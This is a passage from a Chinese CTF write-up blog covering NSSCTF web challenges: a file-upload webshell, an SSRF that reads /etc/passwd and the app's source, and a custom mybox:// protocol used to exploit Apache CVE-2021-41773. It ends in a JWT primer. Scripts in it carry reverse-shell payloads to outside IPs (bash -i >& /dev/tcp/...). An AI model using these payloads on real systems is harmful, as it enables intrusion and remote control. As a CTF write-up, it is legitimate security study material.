<span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后访问 /shell.php，用蚁剑连接，没找到 flag，那就用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>看看，果然在环境变量里：</p>\n<p><img data-src=\"../../../images/NSS/1.png\" alt=\"\" /></p>\n<h3 id=\"nssctf-2nd\"><a class=\"anchor\" href=\"#nssctf-2nd\">#</a> [NSSCTF 2nd]</h3>\n<blockquote>\n<p>脑洞 + 对脑电波</p>\n</blockquote>\n<p>桌面上有个获取 flag，点击之后可以拿到一些细节</p>\n<p><img data-src=\"../../../images/NSS/2.png\" alt=\"2\" height=\"300px\" width=\"750px\" /></p>\n<p>在开始 -&gt; 资源管理器 中的 D 盘 中有一个 WP 里面存有提示</p>\n<p><img data-src=\"../../../images/NSS/3.png\" alt=\"3\" height=\"600px\" width=\"1000px\" /></p>\n<p>因为 只有 &quot;我&quot; 能访问 所以应该得在本机 也就是页面内执行 curl 命令</p>\n<p>打开终端 输入 token</p>\n<blockquote>\n<pre><code>执行 curl https://www.nssctf.cn/flag 即可\n</code></pre>\n</blockquote>\n<p><img data-src=\"../../../images/NSS/4.png\" alt=\"4\" height=\"450px\" width=\"650px\" /></p>\n<h3 id=\"mybox\"><a class=\"anchor\" href=\"#mybox\">#</a> MyBox</h3>\n<blockquote>\n<p>任意文件读取</p>\n</blockquote>\n<p>猜测这里存在 SSRF 漏洞。尝试伪协议读取 <code>/etc/passwd</code> ，成功，存在 SSRF。</p>\n<blockquote>\n<p>/?url=file:///etc/passwd</p>\n</blockquote>\n<h4 id=\"非预期\"><a class=\"anchor\" href=\"#非预期\">#</a> 非预期：</h4>\n<p>读 /start.sh 得到 flag 位置或 /proc/1/environ</p>\n<h4 id=\"预期\"><a class=\"anchor\" href=\"#预期\">#</a> 预期</h4>\n<p>使用</p>\n<blockquote>\n<p>/?url=file:///proc/self/cmdline</p>\n</blockquote>\n<p>查看执行当前进程的命令行参数</p>\n<p><img data-src=\"../../../images/NSS/5.png\" alt=\"5\" height=\"400px\" width=\"600px\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtdnM5ZGo0dXVydHYxa2xxOGEucHk=\">可以得知是 app.py</span></p>\n<blockquote>\n<p>读取源码：/?url=file:///app/app.py</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">,</span> struct</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> urllib <span class=\"token keyword\">import</span> parse</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/?url=dosth'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    url <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> url<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'file://'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">return</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">elif</span> url<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'http://localhost/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">elif</span> url<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'mybox://127.0.0.1:'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        port<span class=\"token punctuation\">,</span> content <span class=\"token operator\">=</span> url<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'/_'</span><span class=\"token punctuation\">,</span> maxsplit<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        s<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>parse<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        res <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            data <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                res <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">827</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>存在 mybox:// 自建协议，本质就是往 port 发包。</p>\n<p>这个其实实现了一个类似 gopher 的功能，向内网的 80 端口发个包看看返回情况，写这个包的脚本在下面：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>test <span class=\"token operator\">=</span>\\</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\"GET /xxx.php HTTP/1.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host: 127.0.0.1:80</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#注意后面一定要有回车，回车结尾表示 http 请求结束</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>tmp <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>new <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'%0A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%0D%0A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">'mybox://127.0.0.1:80/'</span><span class=\"token operator\">+</span><span class=\"token string\">'_'</span><span class=\"token operator\">+</span>new</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到结果后再进行二次编码，发包发到返回状态码 404 为止，可以看见这里 Apache 的版本是 2.4.49，这个版本的 Apache 有一个路径穿越和 RCE 漏洞（CVE-2021-41773）</p>\n<p><img data-src=\"../../../images/NSS/6.png\" alt=\"6\" height=\"400px\" width=\"700px\" /></p>\n<p>可以看到返回里面有提到 apache 版本是 2.4.49，这是个很明显的漏洞版本，可以直接利用 poc 弹 shell 即可：</p>\n<p>我们用 <code>mybox://</code>  协议打 CVE-2021-41773，POST 发包，执行命令反弹 shell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload <span class=\"token operator\">=</span>\\</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\"POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host: 127.0.0.1:80</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Content-Type: application/x-www-form-urlencoded</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Content-Length: 58</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>echo;bash -c 'bash -i >&amp; /dev/tcp/120.46.41.173/9023 0>&amp;1'</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\"\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#注意后面一定要有回车，回车结尾表示 http 请求结束。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>tmp <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>new <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'%0A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%0D%0A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>result <span class=\"token operator\">=</span> mybox<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">:</span><span class=\"token number\">80</span><span class=\"token operator\">/</span><span class=\"token string\">'+'</span>_'<span class=\"token operator\">+</span>new</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>       <span class=\"token comment\"># 这里因为是 GET 请求发包所以要进行两次 url 编码</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>request</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">def</span> <span class=\"token function\">PAR_POST</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> host<span class=\"token operator\">=</span><span class=\"token string\">'127.0.0.1:80'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    PAR <span class=\"token operator\">=</span><span class=\"token string\">\"POST /&#123;&#125; HTTP/1.1\\n\"</span> \\</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>         <span class=\"token string\">\"Host: &#123;&#125;\\n\"</span> \\</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>         <span class=\"token string\">\"User-Agent: curl/7.43.0\\n\"</span> \\</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>         <span class=\"token string\">\"Accept: */*\\n\"</span> \\</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token string\">\"Content-Type: application/x-www-form-urlencoded\\n\"</span> \\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token string\">\"Content-Length: &#123;&#125;\\n\\n\"</span> \\</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>         <span class=\"token string\">\"&#123;&#125;\\n\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>PAR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    NEW_PAR <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>PAR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    NEW_PAR <span class=\"token operator\">=</span> NEW_PAR<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'%0A'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%0D%0A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token string\">'myboxr://127.0.0.1:80/_'</span> <span class=\"token operator\">+</span> NEW_PAR</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> a<span class=\"token operator\">=</span>PAR_POST<span class=\"token punctuation\">(</span>\"cgi<span class=\"token operator\">-</span><span class=\"token builtin\">bin</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token number\">5</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span><span class=\"token operator\">%</span><span class=\"token operator\">%</span><span class=\"token number\">32</span><span class=\"token operator\">%</span><span class=\"token number\">65</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token operator\">/</span>sh<span class=\"token string\">\",\"</span>echo<span class=\"token punctuation\">;</span>bash <span class=\"token operator\">-</span>c 'bash <span class=\"token operator\">-</span>i <span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span><span class=\"token number\">43.137</span><span class=\"token number\">.36</span><span class=\"token number\">.145</span><span class=\"token operator\">/</span><span class=\"token number\">3333</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>'\"<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>两个都可以用</p>\n<h3 id=\"myjs\"><a class=\"anchor\" href=\"#myjs\">#</a> MyJs</h3>\n<blockquote>\n<p>原型链污染，EJS,NodeJS,JWT</p>\n</blockquote>\n<p>首先得知道以下信息：</p>\n<h4 id=\"1-json-web-token是什么\"><a class=\"anchor\" href=\"#1-json-web-token是什么\">#</a> 1. JSON Web Token 是什么</h4>\n<blockquote>\n<p>JSON Web Token (JWT) 是一个开放标准 (RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为 JSON 对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p>\n</blockquote>\n<h4 id=\"2-什么时候你应该用json-web-token\"><a class=\"anchor\" href=\"#2-什么时候你应该用json-web-token\">#</a> 2. 什么时候你应该用 JSON Web Token</h4>\n<blockquote>\n<p>下列场景中使用 JSON Web Token 是很有用的：</p>\n<ul>\n<li>Authorization (授权) : 这是使用 JWT 的最常见场景。一旦用户登录，后续每个请求都将包含 JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的 JWT 的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>\n<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens 无疑是一种很好的方式。因为 JWT 可以被签名，例如，用公钥 / 私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>\n</ul>\n</blockquote>\n<h4 id=\"3-json-web-token的结构是什么样的\"><a class=\"anchor\" href=\"#3-json-web-token的结构是什么样的\">#</a> 3. JSON Web Token 的结构是什么样的</h4>\n<blockquote>\n<p>JSON Web Token 由三部分组成，它们之间用圆点 (.) 连接。这三部分分别是：</p>\n<ul>\n<li>Header</li>\n<li>Payload</li>\n<li>Signature</li>\n</ul>\n<p>因此，一个典型的 JWT 看起来是这个样子的：</p>\n<blockquote>\n<p>xxxxx.yyyyy.zzzzz</p>\n</blockquote>\n<p>接下来，具体看一下每一部分：</p>\n<ul>\n<li>Header header 典型的由两部分组成：token 的类型（“JWT”）和算法名称（比如：HMAC SHA256 或者 RSA 等等）。</li>\n</ul>\n<p>例如：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">'alg'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"HS256\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token string\">'typ'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"JWT\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后，用 Base64 对这个 JSON 编码就得到 JWT 的第一部分</p>\n<ul>\n<li>\n<p>Payload JWT 的第二部分是 payload，它包含声明（要求）。声明是关于实体 (通常是用户) 和其他数据的声明。声明有三种类型: registered, public 和 private。</p>\n</li>\n<li>\n<ul>\n<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience) 等。</li>\n<li>Public claims : 可以随意定义。</li>\n<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。 下面是一个例子：</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string\">\"sub\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1234567890'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'john'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">:</span>true</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>对 payload 进行 Base64 编码就得到 JWT 的第二部分</p>\n<ul>\n<li>Signature</li>\n</ul>\n<blockquote>\n<p>为了得到签名部分，你必须有编码过的 header、编码过的 payload、一个秘钥，签名算法是 header 中指定的那个，然对它们签名即可。</p>\n</blockquote>\n<p>例如：</p>\n<blockquote>\n<p>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</p>\n</blockquote>\n<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的 token，它还可以验证 JWT 的发送方是否为它所称的发送方。</p>\n</blockquote>\n<h4 id=\"4-json-web-tokens是如何工作的\"><a class=\"anchor\" href=\"#4-json-web-tokens是如何工作的\">#</a> 4. JSON Web Tokens 是如何工作的</h4>\n<blockquote>\n<p>在认证的时候，当用户用他们的凭证成功登录以后，一个 JSON Web Token 将会被返回。此后，token 就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p>\n<p>无论何时用户想要访问受保护的路由或者资源的时候，用户代理（通常是浏览器）都应该带上 JWT，典型的，通常放在 Authorization header 中，用 Bearer schema。</p>\n<p>header 应该看起来是这样的：</p>\n<blockquote>\n<p>Authorization: Bearer</p>\n</blockquote>\n<p>服务器上的受保护的路由将会检查 Authorization header 中的 JWT 是否有效，如果有效，则用户可以访问受保护的资源。如果 JWT 包含足够多的必需的数据，那么就可以减少对某些操作的数据库查询的需要，尽管可能并不总是如此。</p>\n<p>如果 token 是在授权头（Authorization header）中发送的，那么跨源资源共享 (CORS) 将不会成为问题，因为它不使用 cookie。</p>\n</blockquote>\n<h4 id=\"5-基于token的身份认证-与-基于服务器的身份认证\"><a class=\"anchor\" href=\"#5-基于token的身份认证-与-基于服务器的身份认证\">#</a> 5. 基于 Token 的身份认证 与 基于服务器的身份认证</h4>\n<blockquote>\n<p>5.1 基于服务器的身份认证</p>\n<p>在讨论基于 Token 的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：</p>\n<blockquote>\n<p>HTTP 协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证</p>\n</blockquote>\n<p>传统的做法是将已经认证过的用户信息存储在服务器上，比如 Session。用户下次请求的时候带着 Session ID，然后服务器以此检查用户是否认证过。</p>\n<p>这种基于服务器的身份认证方式存在一些问题：</p>\n<ul>\n<li>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</li>\n<li>Scalability : 由于 Session 是在内存中的，这就带来一些扩展性的问题。</li>\n<li>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用 AJAX 调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</li>\n<li>CSRF : 用户很容易受到 CSRF 攻击。</li>\n</ul>\n<p>5.2. JWT 与 Session 的差异 相同点是，它们都是存储用户信息；然而，Session 是在服务器端的，而 JWT 是在客户端的。</p>\n<p>Session 方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。</p>\n<p>而 JWT 方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>\n<p>Session 的状态是存储在服务器端，客户端只有 session id；而 Token 的状态是存储在客户端。</p>\n<p>5.3. 基于 Token 的身份认证是如何工作的 基于 Token 的身份认证是无状态的，服务器或者 Session 中不会存储任何用户信息。</p>\n<p>没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。</p>\n<p>虽然这一实现可能会有所不同，但其主要流程如下：</p>\n<p>- 用户携带用户名和密码请求访问 - 服务器校验用户凭据 - 应用提供一个 token 给客户端 - 客户端存储 token，并且在随后的每一次请求中都带着它 - 服务器校验 token 并返回数据</p>\n<p>注意：</p>\n<p>- 每一次请求都需要 token -Token 应该放在请求 header 中 - 我们还需要将服务器设置为接受来自所有域的请求，用 Access-Control-Allow-Origin: *</p>\n<p>5.4. 用 Token 的好处 - 无状态和可扩展性：Tokens 存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。 - 安全：Token 不是 Cookie。（The token, not a cookie.）每次请求的时候 Token 都会被发送。而且，由于没有 Cookie 被发送，还有助于防止 CSRF 攻击。即使在你的实现中将 token 存储到客户端的 Cookie 中，这个 Cookie 也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话！</p>\n<p>还有一点，token 